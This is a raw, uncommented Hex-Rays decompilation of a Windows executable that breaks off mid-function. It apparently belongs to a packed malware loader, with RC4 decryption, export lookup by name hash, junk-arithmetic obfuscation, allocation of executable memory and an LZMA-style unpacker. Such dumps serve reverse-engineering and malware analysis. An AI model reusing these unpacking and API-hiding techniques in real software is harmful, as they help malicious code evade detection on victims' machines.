/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

int __cdecl sub_40117A(int a1, int a2, unsigned __int8 *a3);
// int (__stdcall *__usercall sub_4013A0@<eax>(int a1@<eax>, int a2@<ebx>))(_DWORD, _DWORD, _DWORD, _DWORD);
unsigned int __cdecl sub_401A5C(_BYTE *a1);
// int __usercall sub_402444@<eax>(int a1@<edi>, int a2@<esi>, int a3);
// void __usercall sub_4025C4(unsigned int a1@<ecx>, void *a2@<edi>, const void *a3@<esi>);
unsigned __int8 __cdecl sub_402AB5(_BYTE *a1, unsigned int a2, int a3);
// int __userpurge sub_402ED9@<eax>(unsigned int a1@<eax>, int a2@<ecx>, _DWORD *a3@<ebp>, int a4, int a5, int a6);
_BYTE *__cdecl sub_403000(_BYTE *a1, _BYTE *a2);
void sub_4034C6();
// int __usercall sub_40353E@<eax>(int a1@<edi>, int a2@<esi>);
int sub_40382D();
unsigned int __fastcall sub_403BC9(int a1, int a2);
// void __usercall __noreturn sub_406F2F(int a1@<ebx>, _DWORD *a2@<esi>);
int __fastcall sub_41188A(int a1, int a2, int a3, int a4);
// int __userpurge sub_411A11@<eax>(int a1@<eax>, int a2@<ecx>, int a3, int a4, int a5, int a6);
// int __userpurge start@<eax>(int a1@<edx>, int a2@<ecx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>, int a6, int a7, int a8);
int __fastcall sub_411C99(unsigned int a1, unsigned int a2, int a3, int a4, int a5, int a6);
// int __usercall sub_411EBC@<eax>(int a1@<eax>, unsigned int a2@<edx>, unsigned int a3@<ecx>);
int __thiscall sub_411F4C(void *this, int a2, int a3, int a4, int a5);
int __thiscall sub_41202C(void *this, int a2, int a3, int a4);
int __stdcall sub_412905(int a1, int a2);
// void __usercall sub_4129DA(int a1@<eax>, unsigned int a2@<edx>, unsigned int a3@<ecx>);
// void __usercall sub_41308F(int a1@<eax>, unsigned int a2@<edx>, unsigned int a3@<ecx>, int a4@<ebp>);
// int __userpurge sub_413142@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4, int a5);
int __fastcall sub_41329F(int a1, int a2, int a3, int a4, int a5);
int __fastcall sub_413324(int a1, int a2, int a3, int a4, int a5);
// int __userpurge sub_413607@<eax>(int result@<eax>, __int16 a2@<dx>, int a3, int a4, int a5, int a6);
int __stdcall sub_413ACB(int a1, int a2, int a3);
int __fastcall sub_41415A(int a1, int a2, int a3, int a4);
// HANDLE __stdcall CreateEventA(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCSTR lpName);
// BOOL __stdcall DisableThreadLibraryCalls(HMODULE hLibModule);
// void __stdcall EnterCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
// HANDLE __stdcall GetCurrentProcess();
// DWORD __stdcall GetCurrentProcessId();
// DWORD __stdcall GetCurrentThreadId();
// DWORD __stdcall GetLastError();
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// BOOL __stdcall HeapDestroy(HANDLE hHeap);
// LONG __stdcall InterlockedExchange(volatile LONG *Target, LONG Value);
// void __stdcall LeaveCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
// HLOCAL __stdcall LocalFree(HLOCAL hMem);
// BOOL __stdcall ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// int __stdcall lstrlenA(LPCSTR lpString);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN unk_4230E5; // weak
_UNKNOWN unk_4231E5; // weak
int dword_443004 = 0; // weak
int dword_443008 = 0; // weak
int dword_44300C = 0; // weak
int dword_443010 = 0; // weak
int dword_443014 = 0; // weak
int dword_443018 = 0; // weak
int dword_44301C = 0; // weak
int dword_443020 = 0; // weak
int dword_443024 = 0; // weak
int dword_443028 = 0; // weak
int dword_44302C = 0; // weak
int dword_443030 = 0; // weak
int dword_443034 = 0; // weak
int dword_443038 = 0; // weak
int dword_44303C = 0; // weak
int dword_443040 = 0; // weak
int dword_443044 = 0; // weak
int dword_443048 = 0; // weak
int dword_44304C = 0; // weak
int dword_44315C = 0; // weak
int dword_44323C = 0; // weak
int dword_443258 = 0; // weak
int dword_4432DC = 0; // weak
int dword_443384 = 0; // weak
int dword_443398 = 0; // weak
int dword_44364C = 0; // weak
int dword_4436C4 = 0; // weak
char byte_4438F0 = '‹'; // weak
_UNKNOWN loc_4438FB; // weak
int dword_443AA8 = 678633; // weak
char byte_443B38 = 'D'; // weak
void *off_443B68 = &unk_444A74; // weak
int dword_443C80 = 721437768; // weak
char byte_443CA8 = '+'; // weak
int dword_443D6C = -1014431676; // weak
char byte_443E2C = '\x1C'; // weak
_UNKNOWN loc_443E6C; // weak
int dword_443FD0 = 456190162; // weak
int dword_4441B0 = -1090501556; // weak
char byte_444280 = 'P'; // weak
char byte_444364 = 'h'; // weak
char byte_444378 = '\0'; // weak
_UNKNOWN loc_444562; // weak
int dword_444588 = 950537475; // weak
int dword_44458C = 68; // weak
char byte_444614 = 'Ô'; // weak
char byte_44484C = '\0'; // weak
int dword_4448BC = 369033284; // weak
char byte_444960 = '\x05'; // weak
int (__stdcall *dword_444B4E)(_DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_444B52)(_DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__fastcall *dword_444B6E)(_DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_444B72)(_DWORD, _DWORD, _DWORD) = NULL; // weak
int (__thiscall *dword_444B76)(_DWORD) = NULL; // weak
int dword_444B7A = 521288629; // weak
_UNKNOWN unk_444B7E; // weak
int dword_444B82 = 0; // weak
int dword_444B86 = 170000; // weak
int (__stdcall *dword_444B9A)(_DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__fastcall *dword_444B9E)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
_UNKNOWN dword_444BA2; // weak
int dword_444BAA = 362436069; // weak
int dword_444BAE = 0; // weak
__int64 (__stdcall *dword_444BB2)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_444BBA = -1919581094; // weak
int dword_444BBE = 0; // weak
int (__fastcall *dword_444BC2)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_444BC6 = 0; // weak
_UNKNOWN unk_444BDE; // weak
int dword_444BF4 = 88675123; // weak
int dword_444BF8 = 0; // weak
int dword_444C10 = 0; // weak
int dword_444C18 = 160925; // weak
_DWORD dword_444C1C = 0; // idb
_UNKNOWN unk_444C24; // weak


//----- (0040117A) --------------------------------------------------------
int __cdecl sub_40117A(int a1, int a2, unsigned __int8 *a3)
{
  unsigned __int8 v3; // bl
  int result; // eax
  unsigned int i; // esi
  char v6; // cl
  int v7; // eax
  unsigned int v8; // esi
  _BYTE *v9; // eax
  unsigned __int8 *v10; // [esp+Ch] [ebp-8h]
  unsigned __int8 v11; // [esp+13h] [ebp-1h]

  v8 = 0;
  v9 = a3;
  do
  {
    v6 = v8++;
    *v9++ = v6;
  }
  while ( v8 < 0x100 );
  a3[256] = 0;
  a3[257] = 0;
  v11 = 0;
  v3 = 0;
  v10 = a3;
  for ( i = 0; i < 0x100; ++i )
  {
    v7 = (v3 + *v10 + *(unsigned __int8 *)(a1 + v11)) % 256;
    v3 = (v3 + *v10 + *(unsigned __int8 *)(a1 + v11)) % 256;
    sub_403000(&a3[i], &a3[(unsigned __int8)v7]);
    result = (v11 + 1) / a2;
    v11 = (v11 + 1) % a2;
    ++v10;
  }
  return result;
}

//----- (004013A0) --------------------------------------------------------
int (__stdcall *__usercall sub_4013A0@<eax>(int a1@<eax>, int a2@<ebx>))(_DWORD, _DWORD, _DWORD, _DWORD)
{
  int (__stdcall *result)(_DWORD, _DWORD, _DWORD, _DWORD); // eax
  int v3; // edx
  int v4; // ebx
  int v5; // edx
  int v6; // ecx
  int v7; // ecx
  int v8; // ecx
  _BYTE *v9; // esi
  char v10; // dl
  int v11; // esi
  int v12; // esi
  int v13; // ecx
  int v14; // ebx
  int v15; // ecx
  unsigned int v16; // esi
  int v17; // ecx
  int v18; // ecx
  __int64 v19; // rax
  bool v20; // cf
  int v21; // ecx
  _BYTE *v22; // edi
  int v23; // edx
  int v24; // eax
  int v25; // esi
  int v26; // edx
  int v27; // ecx
  _BYTE *v28; // edi
  void *v29; // edx
  unsigned int v30; // ebx
  int v31; // ecx
  char *v32; // ebx
  char *v33; // ecx
  int v34; // ebx
  _BYTE *v35; // edi
  int v36; // esi
  int v37; // [esp-8h] [ebp-8h]
  int v38; // [esp-4h] [ebp-4h]
  int v39; // [esp-4h] [ebp-4h]

  v27 = 0x2000;
  dword_443030 -= a2 + 14691;
  v28 = &unk_4231E5;
  LOBYTE(dword_443028) = dword_443028 - 121;
  v29 = &HeapDestroy;
  do
  {
    v38 = v27;
    v11 = a1;
    LOBYTE(dword_443030) = dword_443030 - 108;
    dword_443010 += 4 * (_DWORD)v29;
    a1 = sub_40382D();
    v12 = v11 - (v20 + 12758);
    *v28++ = a1;
    v14 = v13;
    dword_44300C = v12;
    v29 = &lstrlenA;
    v27 = v38 - 1;
  }
  while ( v38 != 1 );
  dword_443040 += v27;
  dword_443008 -= v27;
  dword_444B4E(255, &unk_4230E5);
  dword_443018 = 1785;
  v25 = dword_443FD0 + v14 - 743;
  dword_443028 += 31476;
  dword_443034 = 15569;
  dword_443034 = dword_444B9A(&unk_4230E5, &unk_444BDE, 0, &unk_444C24);
  v16 = (v20 + v25 + 3139 - dword_4448BC) | 0x2730;
  dword_443038 -= v17;
  v39 = dword_444BB2(&unk_444C24, -1073741824, 1, 0, 2, 32, 0);
  dword_443010 = v16;
  v33 = (char *)&GetModuleHandleA + v20 + 18551;
  LOBYTE(dword_443044) = dword_443044 - 100;
  BYTE1(v33) += 85;
  dword_443044 -= v16;
  dword_443048 = 3896;
  dword_444BC2(v33, *(_DWORD *)((char *)&loc_444562 + 2), v39, &unk_4231E5, 0x2000, &dword_444B52, 0, v39);
  dword_444B76((v16 < *(_DWORD *)((char *)&loc_4438FB + 1)) + v31 + 19212);
  v21 = 0x2000;
  v22 = &unk_4231E5;
  dword_44304C += (5507 - dword_443384) & 0x3FFFFFF;
  do
  {
    v37 = v21;
    dword_44302C = 13007;
    v34 = dword_4441B0 + 1;
    BYTE1(v34) ^= v34;
    *v22++ = sub_40382D();
    v4 = v34 + 24890;
    v21 = v37 - 1;
  }
  while ( v37 != 1 );
  dword_443030 = v4;
  BYTE1(v4) -= byte_443B38;
  dword_443040 = (int)v22;
  result = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))sub_402444(
                                                                (int)v22,
                                                                (int)&LeaveCriticalSection,
                                                                1769630462);
  dword_443038 = v18;
  v3 = dword_4436C4 + v26;
  if ( !result )
    goto LABEL_9;
  dword_444B52 = result;
  v4 = dword_44315C;
  result = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))sub_402444((int)&LeaveCriticalSection, 29976, 976580703);
  LOBYTE(dword_443044) = dword_443044 + 3;
  dword_44300C += v4;
  v3 = v5 - dword_443AA8;
  if ( result
    && (LOBYTE(dword_443030) = 69,
        dword_444B72 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD))result,
        dword_44303C = 13969,
        result = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))dword_444B52(0, 0x2000, 12288, 64),
        v4 = (int)&GetCurrentThreadId,
        result) )
  {
    dword_444BA2 = (int)result;
    dword_44302C = 11515;
    LOBYTE(dword_44301C) = -38;
    dword_443004 = 15346;
    LOBYTE(dword_443014) = 75;
    v19 = dword_444BB2(&unk_444C24, -1073741824, 1, 0, 3, 0, 0);
    HIDWORD(v19) -= v20 + 6934;
    dword_443014 = __CFSHR__(25302, 5) + ((unsigned int)&InterlockedExchange & 0x22A7) + 11014;
    dword_443028 += (unsigned int)&InterlockedExchange ^ (unsigned int)&ReadFile;
    BYTE4(v19) -= byte_444960;
    v30 = v19 ^ 0x2968;
    dword_444B9E(*(&loc_443E6C + 1), HIDWORD(v19), v19, dword_444BA2, 0x2000, &unk_4230E5, 0, v19);
    dword_443010 += 12048;
    dword_444B76(&lstrlenA);
    dword_443044 -= 9708;
    dword_443018 = 25364;
    dword_444B6E(v6, v6 + 961, &unk_444C24);
    v20 = (v7 ^ v30) < 0x534D;
    v8 = 0x2000;
    v9 = (_BYTE *)dword_444BA2;
    v23 = 0;
    LOBYTE(dword_443040) = 92;
    v24 = 0;
    dword_443040 -= (__CFADD__(v20, 0x2000) | __CFADD__(v20 + 0x2000, 21818)) + v20 + 30010 + 25065;
    dword_443030 = dword_444BA2 + 18335;
    do
    {
      LOBYTE(v24) = *v9++;
      v23 += v24;
      dword_44302C -= 8528;
      dword_443030 = 37000;
      v24 = 0;
      --v8;
    }
    while ( v8 );
    dword_443010 = 37000;
    dword_444BF8 = v23;
    dword_44302C += 22951;
    dword_443020 += (int)off_443B68;
    dword_444B72(dword_444BA2, 0, 0x8000);
    result = 0;
    v15 = 0x2000;
    v35 = &unk_4231E5;
    v36 = ((unsigned __int8)(v10 - dword_44458C) < 0x2Au) + 41432;
    v32 = (char *)&DisableThreadLibraryCalls
        + (__CFADD__((unsigned __int8)(v10 - dword_44458C) < 0x2Au, 27590) | __CFADD__(
                                                                               ((unsigned __int8)(v10 - dword_44458C) < 0x2Au)
                                                                             + 27590,
                                                                               13842))
        + 32223;
    do
    {
      dword_443040 = (int)v32;
      dword_44300C += v36;
      *v35++ = 0;
      v36 = (int)(v32 + 18655);
      --v15;
    }
    while ( v15 );
  }
  else
  {
LABEL_9:
    dword_443040 = v3;
    dword_44301C = 16773;
    dword_443028 = v4;
  }
  return result;
}
// 401B4B: conditional instruction was optimized away because of '%0x18.4==1'
// 401DD5: variable 'v20' is possibly undefined
// 40174E: variable 'v6' is possibly undefined
// 401754: variable 'v7' is possibly undefined
// 40187F: variable 'v13' is possibly undefined
// 4023C7: variable 'v3' is possibly undefined
// 4019C4: variable 'v17' is possibly undefined
// 402D68: variable 'v31' is possibly undefined
// 402E1B: variable 'v5' is possibly undefined
// 401B67: variable 'v18' is possibly undefined
// 402A3C: variable 'v26' is possibly undefined
// 401834: variable 'v10' is possibly undefined
// 443004: using guessed type int dword_443004;
// 443008: using guessed type int dword_443008;
// 44300C: using guessed type int dword_44300C;
// 443010: using guessed type int dword_443010;
// 443014: using guessed type int dword_443014;
// 443018: using guessed type int dword_443018;
// 44301C: using guessed type int dword_44301C;
// 443020: using guessed type int dword_443020;
// 443028: using guessed type int dword_443028;
// 44302C: using guessed type int dword_44302C;
// 443030: using guessed type int dword_443030;
// 443034: using guessed type int dword_443034;
// 443038: using guessed type int dword_443038;
// 44303C: using guessed type int dword_44303C;
// 443040: using guessed type int dword_443040;
// 443044: using guessed type int dword_443044;
// 443048: using guessed type int dword_443048;
// 44304C: using guessed type int dword_44304C;
// 44315C: using guessed type int dword_44315C;
// 443384: using guessed type int dword_443384;
// 4436C4: using guessed type int dword_4436C4;
// 443AA8: using guessed type int dword_443AA8;
// 443B38: using guessed type char byte_443B38;
// 443B68: using guessed type void *off_443B68;
// 443FD0: using guessed type int dword_443FD0;
// 4441B0: using guessed type int dword_4441B0;
// 44458C: using guessed type int dword_44458C;
// 4448BC: using guessed type int dword_4448BC;
// 444960: using guessed type char byte_444960;
// 444B4E: using guessed type int (__stdcall *dword_444B4E)(_DWORD, _DWORD);
// 444B52: using guessed type int (__stdcall *dword_444B52)(_DWORD, _DWORD, _DWORD, _DWORD);
// 444B6E: using guessed type int (__fastcall *dword_444B6E)(_DWORD, _DWORD, _DWORD);
// 444B72: using guessed type int (__stdcall *dword_444B72)(_DWORD, _DWORD, _DWORD);
// 444B76: using guessed type int (__thiscall *dword_444B76)(_DWORD);
// 444B9A: using guessed type int (__stdcall *dword_444B9A)(_DWORD, _DWORD, _DWORD, _DWORD);
// 444B9E: using guessed type int (__fastcall *dword_444B9E)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 444BA2: using guessed type int dword_444BA2;
// 444BB2: using guessed type __int64 (__stdcall *dword_444BB2)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 444BC2: using guessed type int (__fastcall *dword_444BC2)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 444BF8: using guessed type int dword_444BF8;

//----- (00401A5C) --------------------------------------------------------
unsigned int __cdecl sub_401A5C(_BYTE *a1)
{
  unsigned int result; // eax

  result = 0;
  while ( *a1 )
    result = (char)*a1++ ^ ((result >> 25) | (result << 7));
  return result;
}

//----- (00402444) --------------------------------------------------------
int __usercall sub_402444@<eax>(int a1@<edi>, int a2@<esi>, int a3)
{
  unsigned int i; // esi
  int v5; // eax
  int v6; // ebx
  _DWORD *v7; // edi
  unsigned __int16 *v8; // [esp+18h] [ebp-Ch]
  _DWORD *v9; // [esp+1Ch] [ebp-8h]
  int v10; // [esp+20h] [ebp-4h]

  v5 = sub_40353E(a1, a2);
  v6 = v5;
  v7 = (_DWORD *)(v5 + *(_DWORD *)(v5 + *(_DWORD *)(v5 + 60) + 120));
  if ( !HIWORD(a3) )
  {
    v10 = (unsigned __int16)a3 - v7[4];
    return v6 + *(_DWORD *)(v6 + v7[7] + 4 * v10);
  }
  v9 = (_DWORD *)(v5 + v7[8]);
  v8 = (unsigned __int16 *)(v5 + v7[9]);
  for ( i = 0; v7[6] > i; ++i )
  {
    if ( sub_401A5C((_BYTE *)(v6 + *v9)) == a3 )
    {
      v10 = *v8;
      break;
    }
    ++v9;
    ++v8;
  }
  if ( v7[6] != i )
    return v6 + *(_DWORD *)(v6 + v7[7] + 4 * v10);
  return 0;
}
// 401634: variable 'v10' is possibly undefined

//----- (004025C4) --------------------------------------------------------
void __usercall sub_4025C4(unsigned int a1@<ecx>, void *a2@<edi>, const void *a3@<esi>)
{
  qmemcpy(a2, a3, a1);
}

//----- (00402AB5) --------------------------------------------------------
unsigned __int8 __cdecl sub_402AB5(_BYTE *a1, unsigned int a2, int a3)
{
  unsigned __int8 v3; // bl
  unsigned __int8 result; // al
  unsigned int i; // [esp+Ch] [ebp-8h]
  unsigned __int8 v7; // [esp+13h] [ebp-1h]

  v3 = *(_BYTE *)(a3 + 256);
  v7 = *(_BYTE *)(a3 + 257);
  for ( i = 0; i < a2; ++a1 )
  {
    v3 = (v3 + 1) % 256;
    v7 += *(_BYTE *)(a3 + v3);
    sub_403000((_BYTE *)(a3 + v3), (_BYTE *)(a3 + v7));
    *a1 ^= *(_BYTE *)(a3 + (unsigned __int8)(*(_BYTE *)(a3 + v7) + *(_BYTE *)(a3 + v3)));
    ++i;
  }
  *(_BYTE *)(a3 + 256) = v3;
  result = v7;
  *(_BYTE *)(a3 + 257) = v7;
  return result;
}

//----- (00402ED9) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __userpurge sub_402ED9@<eax>(unsigned int a1@<eax>, int a2@<ecx>, _DWORD *a3@<ebp>, int a4, int a5, int a6)
{
  int v6; // ecx
  unsigned int v7; // eax
  unsigned int *v8; // edi
  unsigned int v9; // ecx
  unsigned int v10; // edi
  unsigned int v11; // eax
  unsigned int v12; // edi
  int v13; // ecx
  unsigned int v14; // esi
  int v15; // ecx
  int v16; // edi
  int v17; // edi
  int v18; // ebx
  int v19; // esi
  int v20; // ecx
  bool v21; // cc
  unsigned int *v23; // ecx
  unsigned int v24; // esi
  unsigned int v25; // edx
  int v26; // esi
  int v27; // edx
  int v28; // edi
  int v29; // ecx
  bool v30; // zf
  int v31; // edx
  int v32; // edi
  int v33; // ebx
  unsigned int *v34; // edx
  unsigned int v35; // edx
  unsigned int v36; // edi
  unsigned int v37; // ecx
  unsigned int v38; // edx
  unsigned int v39; // ebx
  int v40; // ecx
  unsigned int v41; // ecx
  unsigned int v42; // esi
  unsigned int v43; // ecx
  unsigned int v44; // edi
  int v45; // esi
  unsigned int *v46; // edi
  int v47; // ecx
  int v48; // ecx
  bool v49; // sf
  bool v50; // of
  int v51; // edx
  int v52; // ecx
  int v53; // ecx
  int v54; // edx
  unsigned int v55; // eax
  unsigned int *v56; // edi
  int v57; // ecx
  unsigned int v58; // ecx
  unsigned int v59; // ebx
  int v60; // ebx
  char *v61; // ecx
  unsigned int v62; // ecx
  unsigned int v63; // ecx
  unsigned int v64; // esi
  unsigned int v65; // eax
  int v66; // edx
  int v67; // esi
  unsigned int *v68; // ecx
  int v69; // edi
  unsigned int v70; // edx
  unsigned int v71; // esi
  unsigned int v72; // edi
  int v73; // ebx
  unsigned int v74; // edx
  unsigned int *v75; // edi
  int v76; // ecx
  int v77; // ecx
  int v78; // ecx
  int v79; // edx
  char v80; // dl
  int v81; // esi
  int v82; // edi
  int v83; // ecx
  int v84; // ecx
  int v85; // edx
  bool v86; // cc
  int v87; // ecx
  int v88; // edx
  unsigned int v89; // eax
  unsigned int *v90; // edx
  int v91; // edx
  unsigned int v92; // edx
  unsigned int v93; // edi
  int v94; // ecx
  unsigned int v95; // eax
  unsigned int v96; // eax
  int v97; // edx
  unsigned int *v98; // edx
  int v99; // ecx
  unsigned int v100; // ecx
  unsigned int v101; // edi
  int v102; // edx
  unsigned int v103; // ecx
  unsigned int v104; // edi
  unsigned int v105; // edi
  bool v106; // cc

LABEL_1:
  for ( *(a3 - 8) = 3; ; *(a3 - 8) = 8 )
  {
    *(a3 - 11) = *(a3 - 8);
    v73 = 1;
    do
    {
      if ( a1 < 0x1000000 )
      {
        v27 = *(unsigned __int8 *)*(a3 - 2) | (a3[3] << 8);
        a1 <<= 8;
        ++*(a3 - 2);
        a3[3] = v27;
      }
      v74 = *(_DWORD *)(a2 + 4 * v73);
      v24 = v74 * (a1 >> 11);
      if ( a3[3] >= v24 )
      {
        a3[3] -= v24;
        a1 -= v24;
        *(_DWORD *)(a2 + 4 * v73) = v74 - (v74 >> 5);
        v73 = 2 * v73 + 1;
      }
      else
      {
        a1 = v74 * (a1 >> 11);
        *(_DWORD *)(a2 + 4 * v73) = v74 + ((2048 - v74) >> 5);
        v73 *= 2;
      }
      v30 = (*(a3 - 11))-- == 1;
    }
    while ( !v30 );
    v102 = 1;
    v33 = *(a3 - 9) - (1 << *(a3 - 8)) + v73;
    v21 = *(a3 - 3) < 4;
    *(a3 - 12) = v33;
    if ( v21 )
      break;
    v32 = *(a3 - 5);
LABEL_89:
    v60 = v33 + 2;
    v61 = (char *)(a3[2] + *(a3 - 4) - v32);
    do
    {
      v80 = *v61;
      v81 = *(a3 - 4);
      v82 = a3[2];
      --v60;
      *(a3 - 4) = v81 + 1;
      ++v61;
      *((_BYTE *)a3 - 1) = v80;
      *(_BYTE *)(v81 + v82) = v80;
    }
    while ( v60 );
    while ( 1 )
    {
      while ( 1 )
      {
        v45 = *(a3 - 4) & 3;
        v46 = (unsigned int *)(a3[4] + 4 * (v45 + 16 * *(a3 - 3)));
        if ( a1 < 0x1000000 )
        {
          v47 = *(unsigned __int8 *)*(a3 - 2) | (a3[3] << 8);
          a1 <<= 8;
          ++*(a3 - 2);
          a3[3] = v47;
        }
        v58 = *v46;
        v59 = *v46 * (a1 >> 11);
        if ( a3[3] >= v59 )
          break;
        v14 = v58 + ((2048 - v58) >> 5);
        v84 = 3072 * *((unsigned __int8 *)a3 - 1);
        *v46 = v14;
        v85 = 1;
        v86 = *(a3 - 3) < 7;
        v87 = v84 + a3[4] + 7384;
        a1 = v59;
        *(a3 - 8) = v87;
        if ( !v86 )
        {
          *(a3 - 9) = *(unsigned __int8 *)(*(a3 - 4) - *(a3 - 5) + a3[2]);
          while ( 1 )
          {
            *(a3 - 9) *= 2;
            v67 = *(a3 - 9) & 0x100;
            v68 = (unsigned int *)(*(a3 - 8) + 4 * (v67 + v85) + 1024);
            *(a3 - 11) = v68;
            if ( a1 < 0x1000000 )
            {
              v69 = *(unsigned __int8 *)*(a3 - 2) | (a3[3] << 8);
              a1 <<= 8;
              ++*(a3 - 2);
              a3[3] = v69;
            }
            v103 = *v68;
            v104 = v103 * (a1 >> 11);
            if ( a3[3] < v104 )
              JUMPOUT(0x403A0B);
            a3[3] -= v104;
            a1 -= v104;
            *(_DWORD *)*(a3 - 11) = v103 - (v103 >> 5);
            v85 = 2 * v85 + 1;
            if ( !v67 )
              goto LABEL_43;
            if ( v85 >= 256 )
              goto LABEL_11;
          }
        }
        do
        {
          v75 = (unsigned int *)(*(a3 - 8) + 4 * v85);
          if ( a1 < 0x1000000 )
          {
            v76 = *(unsigned __int8 *)*(a3 - 2) | (a3[3] << 8);
            a1 <<= 8;
            ++*(a3 - 2);
            a3[3] = v76;
          }
          v63 = *v75;
          v64 = *v75 * (a1 >> 11);
          if ( a3[3] >= v64 )
          {
            a3[3] -= v64;
            a1 -= v64;
            *v75 = v63 - (v63 >> 5);
            v85 = 2 * v85 + 1;
          }
          else
          {
            a1 = *v75 * (a1 >> 11);
            *v75 = v63 + ((2048 - v63) >> 5);
            v85 *= 2;
          }
LABEL_43:
          ;
        }
        while ( v85 < 256 );
LABEL_11:
        v19 = *(a3 - 4);
        v20 = a3[2];
        *(a3 - 4) = v19 + 1;
        v21 = *(a3 - 3) < 4;
        *((_BYTE *)a3 - 1) = v85;
        *(_BYTE *)(v19 + v20) = v85;
        if ( v21 )
        {
          *(a3 - 3) = 0;
        }
        else if ( (int)*(a3 - 3) >= 10 )
        {
          *(a3 - 3) -= 6;
        }
        else
        {
          *(a3 - 3) -= 3;
        }
      }
      a3[3] -= v59;
      v88 = *(a3 - 3);
      v89 = a1 - v59;
      *v46 = v58 - (v58 >> 5);
      v90 = (unsigned int *)(a3[4] + 4 * v88 + 768);
      if ( v89 < 0x1000000 )
      {
        v77 = *(unsigned __int8 *)*(a3 - 2) | (a3[3] << 8);
        v89 <<= 8;
        ++*(a3 - 2);
        a3[3] = v77;
      }
      v43 = *v90;
      v44 = *v90 * (v89 >> 11);
      if ( a3[3] < v44 )
        break;
      a3[3] -= v44;
      v65 = v89 - v44;
      *v90 = v43 - (v43 >> 5);
      v56 = (unsigned int *)(a3[4] + 4 * *(a3 - 3) + 816);
      if ( v65 < 0x1000000 )
      {
        v57 = *(unsigned __int8 *)(*(a3 - 2))++ | (a3[3] << 8);
        a3[3] = v57;
        JUMPOUT(0x402431);
      }
      v37 = *v56;
      v38 = *v56 * (v65 >> 11);
      if ( a3[3] >= v38 )
      {
        a3[3] -= v38;
        v96 = v65 - v38;
        v97 = a3[4];
        *v56 = v37 - (v37 >> 5);
        v98 = (unsigned int *)(v97 + 4 * *(a3 - 3) + 864);
        if ( v96 < 0x1000000 )
        {
          v99 = *(unsigned __int8 *)*(a3 - 2) | (a3[3] << 8);
          v96 <<= 8;
          ++*(a3 - 2);
          a3[3] = v99;
        }
        v9 = *v98;
        v10 = *v98 * (v96 >> 11);
        if ( a3[3] >= v10 )
        {
          a3[3] -= v10;
          v95 = v96 - v10;
          *v98 = v9 - (v9 >> 5);
          v34 = (unsigned int *)(a3[4] + 4 * *(a3 - 3) + 912);
          if ( v95 < 0x1000000 )
          {
            v94 = *(unsigned __int8 *)*(a3 - 2) | (a3[3] << 8);
            v95 <<= 8;
            ++*(a3 - 2);
            a3[3] = v94;
          }
          v100 = *v34;
          v101 = *v34 * (v95 >> 11);
          if ( a3[3] >= v101 )
          {
            a3[3] -= v101;
            v11 = v95 - v101;
            *v34 = v100 - (v100 >> 5);
            v13 = *(a3 - 10);
            *(a3 - 10) = *(a3 - 6);
          }
          else
          {
            v11 = *v34 * (v95 >> 11);
            v72 = v100 + ((2048 - v100) >> 5);
            v13 = *(a3 - 6);
            *v34 = v72;
          }
          *(a3 - 6) = *(a3 - 7);
        }
        else
        {
          v11 = *v98 * (v96 >> 11);
          v12 = v9 + ((2048 - v9) >> 5);
          v13 = *(a3 - 7);
          *v98 = v12;
        }
        *(a3 - 7) = *(a3 - 5);
        *(a3 - 5) = v13;
        goto LABEL_79;
      }
      v39 = v37 + ((2048 - v37) >> 5);
      v40 = 16 * (*(a3 - 3) + 15);
      *v56 = v39;
      v7 = v38;
      v8 = (unsigned int *)(a3[4] + 4 * (v45 + v40));
      if ( v38 < 0x1000000 )
      {
        v7 = v38 << 8;
        v48 = *(unsigned __int8 *)(*(a3 - 2))++ | (a3[3] << 8);
        a3[3] = v48;
      }
      v62 = *v8;
      v25 = v62 * (v7 >> 11);
      if ( a3[3] >= v25 )
      {
        a3[3] -= v25;
        v11 = v7 - v25;
        *v8 = v62 - (v62 >> 5);
LABEL_79:
        *(a3 - 3) = *(a3 - 3) >= 7 ? 11 : 8;
        v23 = (unsigned int *)(a3[4] + 5328);
        goto LABEL_105;
      }
      v26 = *(a3 - 4);
      a1 = v62 * (v7 >> 11);
      v50 = __OFSUB__(*(a3 - 3), 7);
      v49 = *(a3 - 3) - 7 < 0;
      *v8 = v62 + ((2048 - v62) >> 5);
      v51 = a3[2];
      *(a3 - 3) = 2 * (v49 == v50) + 9;
      v52 = *(a3 - 4) - *(a3 - 5);
      ++*(a3 - 4);
      LOBYTE(v52) = *(_BYTE *)(v52 + v51);
      *((_BYTE *)a3 - 1) = v52;
      *(_BYTE *)(v26 + v51) = v52;
    }
    v11 = *v90 * (v89 >> 11);
    v105 = v43 + ((2048 - v43) >> 5);
    v106 = *(a3 - 3) < 7;
